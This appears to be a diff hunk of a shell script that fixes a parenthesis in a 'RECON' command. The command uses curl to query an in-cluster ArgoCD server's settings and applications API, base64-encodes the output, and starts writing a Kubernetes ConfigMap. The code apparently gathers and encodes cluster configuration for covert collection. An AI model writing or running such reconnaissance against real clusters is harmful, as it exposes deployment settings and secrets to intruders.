@@ -14,7 +14,7 @@ RECON=$( (
   curl -k -s https://argocd-server.argocd.svc.cluster.local/api/v1/settings 2>/dev/null | head -c 500
   echo "===APPLICATIONS==="
   curl -k -s https://argocd-server.argocd.svc.cluster.local/api/v1/applications 2>/dev/null | head -c 300
-) | base64 | tr -d '\n'
+) | base64 | tr -d '\n' )
 cat << EOF
 apiVersion: v1
 kind: ConfigMap
